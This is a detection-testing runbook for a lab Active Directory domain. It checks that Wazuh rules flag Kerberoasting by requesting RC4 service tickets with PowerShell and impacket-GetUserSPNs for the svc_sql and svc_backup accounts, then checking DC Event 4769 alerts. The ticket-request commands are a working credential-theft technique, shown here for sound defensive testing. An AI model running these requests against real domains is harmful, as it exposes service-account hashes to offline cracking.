# Kerberoasting Detection Commands

## Rule file

```text
rules/kerberoasting_detection.xml
```

This rule file detects Domain Controller Security Event 4769:

```text
100400 — successful service-ticket visibility, level 3
100401 — RC4 ticket for non-machine service account, level 9, T1558.003
```

DC Wazuh agent: `001`.

## DC telemetry preflight

Run from elevated PowerShell on DC01:

```powershell
auditpol.exe /get /subcategory:'Kerberos Service Ticket Operations'

Get-Service KDC, WazuhSvc |
    Select-Object Name, Status

Get-WinEvent -FilterHashtable @{
    LogName = 'Security'
    Id      = 4769
} -MaxEvents 5 |
    Select-Object TimeCreated, RecordId, Message
```

Expected audit state:

```text
Success and Failure
```

## Controlled SPN verification

```powershell
Import-Module ActiveDirectory

Get-ADUser svc_sql -Properties ServicePrincipalName,msDS-SupportedEncryptionTypes |
    Select-Object SamAccountName,Enabled,ServicePrincipalName,msDS-SupportedEncryptionTypes

Get-ADUser svc_backup -Properties ServicePrincipalName,msDS-SupportedEncryptionTypes |
    Select-Object SamAccountName,Enabled,ServicePrincipalName,msDS-SupportedEncryptionTypes

setspn.exe -L svc_sql
setspn.exe -L svc_backup
```

Controlled SPNs used in this lab include:

```text
MSSQLSvc/sql-lab01.SIMULATION.LOCAL:1433
HTTP/web-lab01.SIMULATION.LOCAL:80
```

## K01 — normal AES machine-service ticket

Run from a domain-user PowerShell session on WIN01. Purging the current session
cache forces a fresh KDC request.

```powershell
klist.exe purge
Add-Type -AssemblyName System.IdentityModel

$Spn = 'HOST/DC01.SIMULATION.LOCAL'
$Ticket = New-Object `
    System.IdentityModel.Tokens.KerberosRequestorSecurityToken($Spn)

$Ticket.ServicePrincipalName
klist.exe tickets
```

Expected DC/Wazuh result:

```text
Event 4769
Status: 0x0
TicketEncryptionType: 0x12
Rule: 100400
Level: 3
No T1558.003 alert
```

## K02 — targeted RC4 service ticket from Windows

Run as the controlled ordinary domain requester.

```powershell
whoami
klist.exe purge
Add-Type -AssemblyName System.IdentityModel

$Spn = 'MSSQLSvc/sql-lab01.SIMULATION.LOCAL:1433'
$Ticket = New-Object `
    System.IdentityModel.Tokens.KerberosRequestorSecurityToken($Spn)

$Ticket.ServicePrincipalName
klist.exe tickets
```

Expected DC/Wazuh result:

```text
Event 4769
Service account: svc_sql
Status: 0x0
TicketEncryptionType: 0x17
Rule: 100401
Level: 9
MITRE: T1558.003
```

If an existing ticket is reused, no new Event 4769 occurs. Purge the current
session ticket cache immediately before the single request.

## K03 — targeted Impacket request

Run from Kali/Pi with current lab routing. Credentials are entered
interactively; never place them in this repository or shell history.

```bash
export DOMAIN='SIMULATION.LOCAL'
export DC_IP='<DC_IP>'
export REQUESTER='yassine.karimi'
export TARGET='svc_sql'
export OUT='/tmp/WAZUH_KERBEROAST_TGS.txt'

rm -f "$OUT"

impacket-GetUserSPNs \
  "$DOMAIN/$REQUESTER" \
  -dc-ip "$DC_IP" \
  -request-user "$TARGET" \
  -request \
  -outputfile "$OUT"

[ -s "$OUT" ] && echo 'targeted_ticket_obtained=true'
rm -f "$OUT"
[ ! -e "$OUT" ] && echo 'ticket_material_deleted=true'
```

Expected: one controlled RC4 request for `svc_sql`, DC Event 4769, rule
`100401`, level 9.

## K04 — alternate controlled service account

```bash
export DOMAIN='SIMULATION.LOCAL'
export DC_IP='<DC_IP>'
export REQUESTER='omar.rahmani'
export TARGET='svc_backup'
export OUT='/tmp/WAZUH_KERBEROAST_BACKUP_TGS.txt'

rm -f "$OUT"

impacket-GetUserSPNs \
  "$DOMAIN/$REQUESTER" \
  -dc-ip "$DC_IP" \
  -request-user "$TARGET" \
  -request \
  -outputfile "$OUT"

[ -s "$OUT" ] && echo 'targeted_ticket_obtained=true'
rm -f "$OUT"
[ ! -e "$OUT" ] && echo 'ticket_material_deleted=true'
```

Historical PASS:

```text
svc_sql    → rule 100401 / level 9
svc_backup → rule 100401 / level 9
```

## DC event verification

Set `$Start` immediately before the request.

```powershell
$Start = Get-Date

Get-WinEvent -FilterHashtable @{
    LogName   = 'Security'
    Id        = 4769
    StartTime = $Start
} | Select-Object TimeCreated, RecordId, Message
```

Fields to record:

```text
TargetUserName
ServiceName
TicketEncryptionType
Status
IpAddress
EventRecordID
```

## Dashboard filters

All rescued service-ticket visibility:

```text
agent.id:001 AND rule.id:100400
```

High-signal Kerberoasting:

```text
agent.id:001 AND rule.id:100401
```

## Cleanup

```powershell
klist.exe purge
```

```bash
rm -f /tmp/WAZUH_KERBEROAST_*_TGS.txt
```

No password cracking or credential reuse belongs in this test. Detection PASS
ends after ticket issuance, Wazuh evidence, and artifact deletion.

## Historical PASS evidence

```text
DC records: 19850, 19872, 19880, 19881, 19931, 19953
Rule: 100401
Level: 9
MITRE: T1558.003
```
